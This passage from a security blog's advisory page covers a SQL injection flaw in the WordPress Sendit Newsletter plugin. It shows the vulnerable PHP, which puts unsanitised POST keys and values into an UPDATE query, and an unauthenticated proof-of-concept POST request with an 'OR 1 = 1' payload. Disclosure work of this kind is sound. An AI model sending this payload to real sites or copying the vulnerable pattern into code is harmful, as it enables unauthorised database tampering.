class="crayon-v">subscriber_info</span><span class="crayon-o">=</span><span class="crayon-e">json_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">_POST</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">update</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-s">"update "</span><span class="crayon-sy">.</span><span class="crayon-v">SENDIT_EMAIL_TABLE</span><span class="crayon-sy">.</span><span class="crayon-s">" set $k = '$v' where id_email = $id"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//$update="update ".SENDIT_EMAIL_TABLE." set subscriber_info = '$subscriber_info' where id_email = $id";</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">v</span><span class="crayon-o">==</span><span class="crayon-s">'y'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">confirmed</span><span class="crayon-o">=</span><span class="crayon-s">'confirmed'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">style</span><span class="crayon-o">=</span><span class="crayon-s">'vertical-align:middle; background:#E4FFCF;'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">v</span><span class="crayon-o">==</span><span class="crayon-s">'d'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">confirmed</span><span class="crayon-o">=</span><span class="crayon-s">'unsubscribed'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">style</span><span class="crayon-o">=</span><span class="crayon-s">'vertical-align:middle; background:#fd919b'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">v</span><span class="crayon-o">==</span><span class="crayon-s">'n'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">confirmed</span><span class="crayon-o">=</span><span class="crayon-s">'not confirmed'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">style</span><span class="crayon-o">=</span><span class="crayon-s">'vertical-align:middle; background:#fffbcc;'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;div style="'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">style</span><span class="crayon-sy">.</span><span class="crayon-s">'display:block;height:35px"&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">confirmed</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">update</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-s">"update "</span><span class="crayon-sy">.</span><span class="crayon-v">SENDIT_EMAIL_TABLE</span><span class="crayon-sy">.</span><span class="crayon-s">" set $k = '$v' where id_email = $id"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">v</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">endif</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">endif</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0086 seconds] -->
<p>Because this call does not require any sort of authentication, we can make a simple POST request to exploit this and inject SQL:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a6a2da107991881" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/sendit/ajax.php? HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 71

id=1-52179 OR 1 = 1 ;-3&amp;thiskeygoesintothequery=settingthevaluetothis</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a6a2da107991881-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2da107991881-2">2</div><div class="crayon-num" data-line="crayon-53c9878a6a2da107991881-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2da107991881-4">4</div><div class="crayon-num" data-line="crayon-53c9878a6a2da107991881-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2da107991881-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a6a2da107991881-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">sendit</span><span class="crayon-o">/</span><span class="crayon-v">ajax</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2da107991881-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878a6a2da107991881-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2da107991881-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">71</span></div><div class="crayon-line" id="crayon-53c9878a6a2da107991881-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2da107991881-6"><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">-</span><span class="crayon-cn">52179</span><span class="crayon-h"> </span><span class="crayon-st">OR</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-o">-</span><span class="crayon-cn">3</span><span class="crayon-o">&amp;</span><span class="crayon-v">thiskeygoesintothequery</span><span class="crayon-o">=</span><span class="crayon-i">settingthevaluetothis</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0027 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/sendit-newsletter/" rel="tag">Sendit Newsletter</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/07/10/wordpress-sendit-newsletter-plugin-multiple-sql-injection/#respond" title="Comment on WordPress Sendit Newsletter plugin multiple SQL injection">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-43 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="http://ceriksen.com/tag/wordpress-plugin/page/3/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						<div class="nav-next"><a href="http://ceriksen.com/tag/wordpress-plugin/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
						
		
	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</section><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="http://ceriksen.com/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="http://ceriksen.com/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="http://ceriksen.com/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:46:02 by W3 Total Cache -->